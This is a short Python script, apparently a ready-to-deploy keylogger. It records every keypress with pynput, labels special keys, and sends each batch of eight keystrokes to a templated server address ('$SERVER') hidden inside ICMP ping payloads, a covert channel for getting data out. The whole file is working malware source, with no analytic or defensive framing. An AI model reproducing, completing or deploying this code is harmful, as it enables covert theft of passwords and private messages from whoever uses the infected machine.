from pynput import keyboard
from pythonping import ping
from threading import Thread
from time import sleep
SERVER = "$SERVER"
keys = []
def addToSend(arg):
    keys.append(arg)
    if len(keys) == 8:
        ping(SERVER, count=1, payload="".join(keys), verbose=False, timeout=1)
        del keys[:]
def on_press(key):
    key = str(key)
    good = [["Key.space", " "],["Key.enter", "[Ent]\n"],["Key.shift", "[Sh]"],["Key.insert", "[Ins]"],["Key.backspace", "[Bck]"],["Key.alt_l", "[Alt L]"],["Key.alt_r", "[Alt R]"],["Key.ctrl_l", "[Ctrl L]"],["Key.ctrl", "[Ctrl]"],["Key.ctrl_r", "[Ctrl R]"],["Key.caps_lock", "[Caps]"],["Key.down", "[Down Arrow]"],["Key.right", "[Right Arrow]"],["Key.left", "[Left Arrow]"],["Key.up", "[Up Arrow]"],["Key.shift_r", "[Shift R]"],["Key.shift_l", "[Shift L]"],["Key.tab", "[Tab]"],["", ""]]
    for i in range(len(good)):
        if good[i][0] == key:
            key = good[i][1]
            break
    if key != "\"'\"":
        key = key.replace("'", "")
    elif key == "\"'\"":
        key = key.replace('"', "")
    addToSend(key)
keyboard.Listener(on_press=on_press).start()
